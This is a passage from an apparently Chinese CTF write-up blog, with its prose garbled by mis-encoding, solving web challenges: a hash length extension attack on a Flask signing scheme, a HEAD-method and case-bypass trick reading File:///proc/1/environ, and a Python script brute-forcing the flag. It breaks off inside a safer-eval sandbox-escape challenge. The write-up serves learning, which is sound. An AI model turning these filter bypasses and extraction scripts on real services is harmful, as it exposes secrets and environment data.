os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        <span class="variable language_">self</span>.action = action</span><br><span class="line">        <span class="variable language_">self</span>.param = param</span><br><span class="line">        <span class="variable language_">self</span>.sign = sign</span><br><span class="line">        <span class="variable language_">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(<span class="variable language_">self</span>.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">self</span>.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(<span class="variable language_">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(<span class="variable language_">self</span>.action, <span class="variable language_">self</span>.param) == <span class="variable language_">self</span>.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…ˆç†ä¸€ä¸‹æ€è·¯ï¼šæœ€ç»ˆçš„flagåº”è¯¥æ˜¯åœ¨result.txtä¸­çš„ï¼Œé‚£ä¹ˆå°±éœ€è¦è§¦å‘Taskç±»çš„Execæ–¹æ³•ï¼Œåœ¨&#x2F;De1taè·¯ç”±ä¸‹å¯ä»¥å®ç°ï¼ŒåŒæ—¶actionã€paramã€signå¯æ§ã€‚Execæ–¹æ³•ä¸­æœ‰ä¸€ä¸ªchecksignæ–¹æ³•ï¼Œè¿™å…¶å®å°±è€ƒå¯Ÿåˆ°hashé•¿åº¦æ‹“å±•æ”»å‡»äº†ã€‚getsignå¯ä»¥è·å–åˆ°ä¸€ä¸ªå·²çŸ¥çš„hashå€¼ã€‚</p>
<p>æˆ‘ä»¬è®¿é—®&#x2F;geneSignè·¯ç”±å¯ä»¥è·å–ä¸€ä¸ªhashå€¼ï¼Œsecert_key+scançš„å“ˆå¸Œå€¼ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">checkSign</span>(<span class="built_in">self</span>):</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">getSign</span>(<span class="built_in">self</span>.action, <span class="built_in">self</span>.param) == <span class="built_in">self</span>.sign):</span><br><span class="line">           <span class="keyword">return</span> True</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">return</span> False</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">task = <span class="title function_ invoke__">Task</span>(action, param, sign, ip)</span><br><span class="line"><span class="keyword">return</span> json.<span class="title function_ invoke__">dumps</span>(task.<span class="title function_ invoke__">Exec</span>())</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ç»™äº†æç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag is in ./flag.txt</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥çš„æ€è·¯æ˜¯åˆ©ç”¨scanå°†flag.txtå†™å…¥result.txtï¼ŒåŒæ—¶ä¼šprint flag.txtçš„å†…å®¹ï¼Œæˆ‘ä»¬å…ˆæ„é€ è¿™ä¸ªã€‚</p>
<p>é¦–å…ˆè®¿é—®&#x2F;geneSignè·¯ç”±ï¼Œè·å–secret_key+flag.txt+scançš„hashå€¼a95501825b9d23020a8f670b281649fa</p>
<p>ç„¶ååœ¨&#x2F;De1taè·¯ç”±ä¸‹æ„é€ actionä¸ºscanï¼Œparamä¸ºflag.txtï¼Œsignä¸ºa95501825b9d23020a8f670b281649faã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104221216421.png" alt="image-20250104221216421"></p>
<p>åªprintäº†ä¸€ä¸ªçŠ¶æ€ç ã€‚ã€‚ã€‚çªç„¶æƒ³èµ·æ¥è¦print resp.textæ‰è¡Œã€‚ã€‚é‚£ä¹ˆå°±éœ€è¦readäº†ï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½è·å–çš„hashå€¼å¿…å®šå¸¦æœ‰scanã€‚è¿™æ—¶æˆ‘ä»¬çªç„¶æ³¨æ„åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if &quot;read&quot; in self.action:</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ actionä¸ºscanread</p>
<p>secret_key+flag.txt+scançš„hashå€¼æ˜¯å·²çŸ¥çš„ã€‚</p>
<p>åœ¨&#x2F;De1taè·¯ç”±ä¸‹æ„é€ actionä¸ºscanxxxxxxxreadï¼Œparamä¸ºflag.txtï¼Œè¿›è¡Œå“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ã€‚</p>
<p>signature:a95501825b9d23020a8f670b281649fa</p>
<p>data:scan</p>
<p>key length:24</p>
<p>data to add:read</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104223600499.png" alt="image-20250104223600499"></p>
<p>2d970424e20612e377913e4a9ea324af</p>
<p>scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</p>
<p>åœ¨&#x2F;De1taè·¯ç”±ä¸‹æ„é€ actionä¸ºscan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read</p>
<p>paramä¸ºflag.txtï¼Œsignä¸º2d970424e20612e377913e4a9ea324af</p>
<p>å‘ç°ä¸è¡Œã€‚ã€‚ã€‚</p>
<p>é‡æ–°æ‹ä¸€ä¸‹æ€è·¯ï¼š</p>
<p>æœ‰readï¼Œæœ‰scanå°±å¯ä»¥</p>
<p>è®¿é—®&#x2F;geneSignè·¯ç”±ï¼Œparamä¸ºflag.txtread</p>
<p>é‚£ä¹ˆè·å–secret_key+flag.txt+readscançš„hashå€¼523423f97fa7df58aec22413b39fd8f2</p>
<p>åœ¨&#x2F;De1taè·¯ç”±ä¸‹æ„é€ actionä¸ºreadscanï¼Œparamä¸ºflag.txtä¸å°±å¥½äº†ã€‚ã€‚ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104224546154.png" alt="image-20250104224546154"></p>
<p>ç›´æ¥å‡ºäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;2ef1cb7c-7d09-49ed-abe6-451e0b4bf48e&#125;</span><br></pre></td></tr></table></figure>



<p>æ¥ä¸‹æ¥å†å›é¡¾ä¸€ä¸‹hashé•¿åº¦æ‹“å±•æ”»å‡»ï¼Œè¿˜æ˜¯å¾—å­¦ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225223289.png" alt="image-20250104225223289"></p>
<p>æˆåŠŸäº†ï¼Œå¯†é’¥24ä½ï¼Œæœ‰ç‚¹ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">len(secert_key) = 16</span><br><span class="line">16 + len(&#x27;scan&#x27;) + len(&#x27;read&#x27;) = 24 = Key Length</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225321393.png" alt="image-20250104225321393"></p>
<h2 id="prize-p4"><a href="#prize-p4" class="headerlink" title="prize_p4"></a>prize_p4</h2><p>è¿™é“é¢˜è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œæˆ‘å¡åœ¨äº†ä¸€ä¸ªç‚¹ä¸Š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;]) </span><br><span class="line"></span><br><span class="line">def getkey(): </span><br><span class="line">	if request.method != &quot;GET&quot;: </span><br><span class="line">		session[&quot;key&quot;]=SECRET_KEY</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥ç”¨ä¸GETç›¸ä¼¼çš„æ–¹æ³•HEADæ¥ç»•è¿‡ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105082600584.png" alt="image-20250105082600584"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,render_template_string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> flag </span><br><span class="line"></span><br><span class="line">SECRET_KEY=<span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.update(<span class="built_in">dict</span>(</span><br><span class="line">    SECRET_KEY=SECRET_KEY,</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"><span class="comment">#src in /app</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_data&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    data = request.form.get(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">        data=data.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8888/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">and</span> url:</span><br><span class="line">        session[<span class="string">&#x27;data&#x27;</span>] = data</span><br><span class="line">        session[<span class="string">&#x27;url&#x27;</span>] = url</span><br><span class="line">        session[<span class="string">&quot;admin&quot;</span>]=<span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;admin&quot;</span>,<span class="literal">False</span>):</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(__file__).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;home.html&quot;</span>,data=session.get(<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;Not find data...&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getkey&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        session[<span class="string">&quot;key&quot;</span>]=SECRET_KEY</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&#x27;&#x27;@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="string">def getkey():</span></span><br><span class="line"><span class="string">    if request.method != &quot;GET&quot;:</span></span><br><span class="line"><span class="string">        session[&quot;key&quot;]=SECRET_KEY&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_hindd_result&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hindd_result</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;data&#x27;</span>] <span class="keyword">and</span> session[<span class="string">&#x27;url&#x27;</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file:&#x27;</span> <span class="keyword">in</span> session[<span class="string">&#x27;url&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;no no no&quot;</span></span><br><span class="line">        data=(session[<span class="string">&#x27;data&#x27;</span>]).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        url_text=urllib.request.urlopen(session[<span class="string">&#x27;url&#x27;</span>]).read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> url_text <span class="keyword">in</span> data <span class="keyword">or</span> data <span class="keyword">in</span> url_text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you get it&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;what ???&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getflag&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    res = flag.waf(request)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<p>æ€è·¯å°±æ˜¯é€šè¿‡&#x2F;get_hindd_resultè·¯ç”±è¿›è¡Œç›²æ³¨ã€‚</p>
<p>å› ä¸ºç›´æ¥getflagä»–æ²¡å›æ˜¾å•Šï¼Ÿï¼</p>
<p>fileè¿‡æ»¤å¯ä»¥å¤§å°å†™ç»•è¿‡</p>
<p>å°è¯•ä¸€ä¸‹File:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ     NSSCTFå‘ç°å¯è¡Œ</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105083934681.png" alt="image-20250105083934681"></p>
<p>æ¥ä¸‹æ¥ç¼–å†™ç›²æ³¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload_sum=string.ascii_lowercase+string.digits+<span class="string">&#x27;&#123;&#125;-&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload_sum)</span><br><span class="line">target=<span class="string">&#x27;http://node4.anna.nssctf.cn:28374/&#x27;</span></span><br><span class="line">payload_data=<span class="string">&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">payload_url=<span class="string">&quot;File:///proc/1/environ&quot;</span></span><br><span class="line">target_get_data=target+<span class="string">&#x27;get_data&#x27;</span></span><br><span class="line">target_get_flag=target+<span class="string">&#x27;get_hindd_result&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payload_sum:</span><br><span class="line">        temp=payload_data+j</span><br><span class="line">        <span class="comment">#print(j)</span></span><br><span class="line">        session = requests.session()</span><br><span class="line">        session.post(target_get_data,data=&#123;<span class="string">&#x27;data&#x27;</span>:temp,<span class="string">&#x27;url&#x27;</span>:payload_url,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;%E6%8F%90%E4%BA%A4&#x27;</span>&#125;)</span><br><span class="line">        response=session.get(target_get_flag,cookies=&#123;<span class="string">&#x27;session&#x27;</span>:<span class="built_in">str</span>(session.cookies.values())[<span class="number">2</span>:-<span class="number">2</span>]&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(str(session.cookies.values())[2:-2])</span></span><br><span class="line">        <span class="comment">#print(response.text)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;you get it&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            payload_data+=j</span><br><span class="line">            <span class="built_in">print</span>(payload_data)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;bad!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>è„šæœ¬ç¼–å†™èƒ½åŠ›è¿˜æ˜¯å¤ªå·®äº†ï¼Œå†™äº†åŠå¤©ã€‚ã€‚ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;710ce1eb-8431-41e6-83fa-3213a14db9fc&#125;</span><br></pre></td></tr></table></figure>





<h2 id="GKCTF-2020-ezä¸‰å‰‘å®¢-easynode"><a href="#GKCTF-2020-ezä¸‰å‰‘å®¢-easynode" class="headerlink" title="[GKCTF 2020]ezä¸‰å‰‘å®¢-easynode"></a>[GKCTF 2020]ezä¸‰å‰‘å®¢-easynode</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160042913.png" alt="image-20250105160042913" style="zoom:80%;" />

<p>å‘ç°ä¸€ä¸ªsafer-eval 1.3.6ç‰ˆæœ¬ï¼Œå­˜åœ¨æ²™ç®±é€ƒé€¸çš„æ¼æ´ã€‚</p>
<p>ä¸‹é¢çœ‹çœ‹æºä»£ç ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&#x27;safer-eval&#x27;</span>); <span class="comment">// 2019.7/WORKER1 æ‰¾åˆ°ä¸€ä¸ªå¾ˆæ£’çš„åº“</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title 